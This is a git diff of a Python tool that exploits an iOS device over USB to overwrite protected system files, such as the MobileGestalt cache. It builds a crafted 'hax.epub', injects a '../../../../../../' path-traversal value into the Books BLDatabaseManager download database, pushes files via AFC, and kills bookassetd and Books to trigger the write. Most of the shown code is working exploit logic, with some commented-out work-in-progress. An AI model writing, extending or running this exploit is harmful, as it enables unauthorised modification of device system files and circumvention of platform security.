@@ -14,6 +14,7 @@ import time
 import threading
 import functools
 import plistlib
+import zipfile
 from pathlib import Path, PurePosixPath
 from threading import Timer
 from http.server import HTTPServer, SimpleHTTPRequestHandler
@@ -48,7 +49,9 @@ def get_lan_ip():
 def start_http_server():
     handler = functools.partial(SimpleHTTPRequestHandler)
     httpd = HTTPServer(("0.0.0.0", 0), handler)
-    info_queue.put((get_lan_ip(), httpd.server_port))
+    click.secho(f"Starting HTTP server on port {httpd.server_port}", fg="bright_black")
+    global http_server_info
+    http_server_info = (get_lan_ip(), httpd.server_port)
     httpd.serve_forever()
 
 def ensure_afc_directory(afc: AfcService, remote_path: str):
@@ -66,7 +69,9 @@ def ensure_afc_directory(afc: AfcService, remote_path: str):
 def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxyService):
     http_thread = threading.Thread(target=start_http_server, daemon=True)
     http_thread.start()
-    ip, port = info_queue.get()
+    while http_server_info == (None, None):
+        time.sleep(0.1)
+    ip, port = http_server_info
     click.secho(f"Hosting temporary http server on: http://{ip}:{port}/", fg="bright_black")
 
     afc = AfcService(lockdown=service_provider)
@@ -111,7 +116,6 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
     
     total_files = 1
     relative_files = []
-    remote_file_paths = []
     if overridefile.is_dir():
         # Upload directory
         total_files = 0
@@ -122,7 +126,7 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
                 relative_path = local_file_path.relative_to(overridefile)
                 relative_files.append(relative_path)
                 remote_file_path = f"Downloads/{relative_path.as_posix()}"
-                remote_file_paths.append(remote_file_path)
+                # remote_file_paths.append(remote_file_path)
                 click.secho(f"Uploading {relative_path.as_posix()} to {remote_file_path}", fg="bright_black")
                 # Ensure parent directories exist
                 ensure_afc_directory(afc, remote_file_path)
@@ -134,9 +138,22 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
         remote_file_path = f"Downloads/{path.name}"
         afc.push(overridefile, remote_file_path)
 
+    # WIP iOS slop
+    # shutil.rmtree("Downloads", ignore_errors=True)
+    # Path("Downloads").mkdir(exist_ok=True)
+    # if overridefile.is_file():
+    #     shutil.copyfile(overridefile, Path("Downloads") / overridefile.name)
+    #     relative_files.append(Path(overridefile.name))
+    # else:
+    #     shutil.copytree(overridefile, Path("Downloads"), dirs_exist_ok=True)
+    #     for root, dirs, files in os.walk(overridefile):
+    #         for file in files:
+    #             local_file_path = Path(root) / file
+    #             relative_path = local_file_path.relative_to(overridefile)
+    #             relative_files.append(relative_path)
+    #     total_files = len(relative_files)
+    afc.push("iTunesMetadata.plist", "Downloads/iTunesMetadata.plist")
 
-    if total_files == 1:
-        relative_files.append(Path(path.name))
     # Loop so that we can download multiple files if needed
     for (i, relative_path) in enumerate(relative_files):
         click.secho(f"Processing file {i+1} of {total_files}: {relative_path.as_posix()}", fg="yellow")
@@ -148,23 +165,27 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
             filetooverwritename = str(path.joinpath(relative_path))
         click.secho(f"File to overwrite on device: {filetooverwritename}", fg="bright_black")
         click.secho("Relative path: " + str(relative_path), fg="bright_black")
+        # Craft our epub file here
+        epub_path = Path("hax.epub")
+        with zipfile.ZipFile(epub_path, 'w') as epub:
+            # Add mimetype file
+            epub.writestr("Caches/mimetype", "application/epub+zip", compress_type=zipfile.ZIP_STORED)
+            epub.write(overridefile.joinpath(relative_path), f"Caches/{relative_path.as_posix()}", compress_type=zipfile.ZIP_DEFLATED)
+        afc.push(epub_path, "Downloads/hax.epub")
         shutil.copyfile("BLDatabaseManager.sqlite", "tmp.BLDatabaseManager.sqlite")
         blconn = sqlite3.connect("tmp.BLDatabaseManager.sqlite")
         cursor = blconn.cursor()
-        print(f"""
+        # What the fuck I'm die trying...
+        sequel_command = f"""
         UPDATE ZBLDOWNLOADINFO
         SET 
-            ZASSETPATH = '{filetooverwritename}.zassetpath',
-            ZDOWNLOADID = '../../../../../../{filetooverwritename}',
-            ZPLISTPATH = '/var/mobile/Media/Downloads/{relative_path.as_posix()}'
-        """)
-        cursor.execute(f"""
-        UPDATE ZBLDOWNLOADINFO
-        SET 
-            ZASSETPATH = '{filetooverwritename}.zassetpath',
-            ZDOWNLOADID = '../../../../../../{filetooverwritename}',
-            ZPLISTPATH = '/var/mobile/Media/Downloads/{relative_path.as_posix()}'
-        """)
+            ZASSETPATH = '/var/mobile/Media/Downloads/hax.epub',
+            ZDOWNLOADID = '../../../../../../{filetooverwritename[1:]}',
+            ZPLISTPATH = '/private/var/mobile/Media/Downloads/iTunesMetadata.plist',
+            ZURL = '/var/mobile/Media/Downloads/{relative_path.as_posix()}'
+        """
+        click.secho(sequel_command, fg="bright_black")
+        cursor.execute(sequel_command)
         blconn.commit()
 
         # Modify downloads.28.sqlitedb
@@ -214,11 +235,32 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
         
         # Wait for itunesstored to finish download and raise an error
         click.secho("Waiting for itunesstored to finish download...", fg="yellow")
+        download_timeout = 60  # seconds
+        download_start_time = time.time()
         for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
-            if "Install complete for download: 6936249076851270150 result: Failed" in syslog_entry.message:
-                click.secho("Download complete!", fg="bright_black")
+            # Check for timeout
+            if time.time() - download_start_time > download_timeout:
+                click.secho("Download wait timeout reached, continuing...", fg="yellow")
                 break
-        
+            
+            if "6936249076851270150" in syslog_entry.message:
+                click.secho(f"Found syslog entry: {syslog_entry.message}", fg="bright_black")
+            
+            # Check for various completion states
+            if "Install complete for download: 6936249076851270150" in syslog_entry.message:
+                click.secho(f"Download complete: {syslog_entry.message}", fg="bright_black")
+                break
+            # Check for download finished (success or failure)
+            if "6936249076851270150" in syslog_entry.message and ("finished" in syslog_entry.message.lower() or "complete" in syslog_entry.message.lower() or "failed" in syslog_entry.message.lower() or "error" in syslog_entry.message.lower()):
+                click.secho(f"Download state changed: {syslog_entry.message}", fg="bright_black")
+                break
+            # Check if download was added to asset queue (means it's processing)
+            if "AssetDownloadDelegate" in syslog_entry.message and "6936249076851270150" in syslog_entry.message:
+                click.secho(f"Asset delegate: {syslog_entry.message}", fg="bright_black")
+            # Check for BLDatabaseManager being written
+            if "BLDatabaseManager" in syslog_entry.message:
+                click.secho(f"BLDatabaseManager activity: {syslog_entry.message}", fg="bright_black")
+
         # Kill bookassetd and Books processes to trigger file overwrite
         pid_bookassetd = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
         pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
@@ -378,12 +420,12 @@ if __name__ == "__main__":
     if len(sys.argv) != 3:
         print("Usage: python run.py /path/to/local/file (ex. ./MobileGestalt/com.apple.MobileGestalt.plist) /path/to/file_on_iOS (like /private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist)")
         exit(1)
-    
     lockdown = create_using_usbmux()
+    http_server_info = (None, None)
     # overridefile is the local file to upload
     overridefile = Path(sys.argv[1])
     # path is the path on the iOS device to overwrite
     path = PurePosixPath(sys.argv[2])
-    info_queue = queue.Queue()
+    
     os.chdir(Path(__file__).resolve().parent)
     asyncio.run(connection_context(lockdown))
